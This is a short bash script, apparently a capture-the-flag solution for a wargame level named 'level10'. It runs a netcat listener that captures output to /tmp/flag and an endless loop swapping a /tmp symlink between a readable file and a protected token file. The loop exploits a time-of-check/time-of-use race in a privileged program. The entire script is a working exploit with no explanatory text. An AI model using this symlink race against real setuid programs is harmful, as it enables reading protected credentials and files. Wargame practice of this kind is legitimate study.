#!/bin/bash


nc -lk 6969 >/tmp/flag &

while true; do
    ln -fs ~/level10 /tmp/get; ln -fs ~/token /tmp/get;
done &

